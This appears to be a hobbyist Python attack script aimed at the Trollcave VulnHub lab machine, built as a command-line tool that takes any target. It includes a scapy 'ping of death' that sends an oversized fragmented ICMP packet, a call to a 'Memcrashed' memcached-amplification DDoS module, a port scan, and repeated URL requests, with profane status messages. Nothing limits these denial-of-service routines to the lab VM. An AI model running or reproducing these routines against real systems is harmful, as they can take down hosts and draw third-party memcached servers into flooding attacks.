#! python3
# a Trollcave Vulnhub attack tool
#
#____________   ______________
#\______ \   \ /   /\______   \
# |    |  \   Y   /  |     ___/
# |    `   \     /   |    |
#/_______  /\___/    |____|
#        \/
#
# Jeff Barron

import requests
import bs4
import argparse
import webbrowser
from scapy.all import *
import portscanner
import memcrashed
#if __name__ == '__main__':
logo = r"""

                         ____________   ______________ 
                         \______ \   \ /   /\______   \
                          |    |  \   Y   /  |     ___/
                          |    `   \     /   |    |    
                         /_______  /\___/    |____|    
                                 \/                     
"""
print(logo)
logo2= r'''
____________   ______________
 \______ \   \ /   /\______   \
  |    |  \   Y   /  |     ___/
  |    `   \     /   |    |
 /_______  /\___/    |____|
         \/
'''
#print(logo2)
parser = argparse.ArgumentParser(description="DVP! Because fuck the Trollcave vulnhub vm!")
parser.add_argument("-t", "--target", type=str, help="Target URL")
parser.add_argument('-v', "--verbose", action="store_true", help="Increase total verbosity") ## this doesn't do anything
parser.add_argument('-b', "--bust", type=int, help="Number of keks to append to url")
parser.add_argument('-s', "--scan", help="Port scan the target.", action="store_true")
parser.add_argument('-p', "--ping", help="Ping of Death, via scapy", action="store_true")
parser.add_argument('-m', "--mem", help="Memcrashed DDOS by @037 and Nuzer-Rednek", action="store_true")
args=parser.parse_args()

if args.target == None:
    print("You must specify a target!")
    exit()

target=args.target
if args.scan == True:
    print("Port scanning the target: ", target)
    portscanner.run(target)
if args.ping == True:
    print("Sending the ping of death to ", target)
    send( fragment(IP(dst=target)/ICMP()/("X"*70000)) )
    print("BAM!")
if args.mem == True:
    print("Oh boy. We're memcrashing ", target)
    memcrashed.run(target)
res = requests.get(target)
res.raise_for_status()
trollpage = bs4.BeautifulSoup(res.text, "html.parser")
print("printing args")
print(args.target)
print(args.scan)
print(args.bust)

if args.bust is not None:
    print("Busting this mother fucker!")
    trollbust=target+'KEK'*args.bust
    res = requests.get(trollbust)
    res.raise_for_status()
# payload={'report_content': trollbust}
print("DVP executed against ", target, "fuckin busted!")










